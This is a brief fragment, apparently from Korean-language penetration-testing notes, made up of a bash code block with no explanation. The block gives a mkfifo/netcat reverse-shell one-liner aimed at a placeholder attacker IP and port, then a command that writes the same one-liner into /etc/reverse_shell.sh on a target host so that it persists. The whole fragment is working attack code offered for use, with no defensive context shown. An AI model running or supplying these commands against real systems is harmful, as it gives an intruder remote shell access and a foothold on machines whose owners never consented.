...
```bash
# mkfifo를 이용한 방법
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 공격자IP PORT >/tmp/f

# reverse shell script in target host
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 공격자IP PORT >/tmp/f' >> /etc/reverse_shell.sh
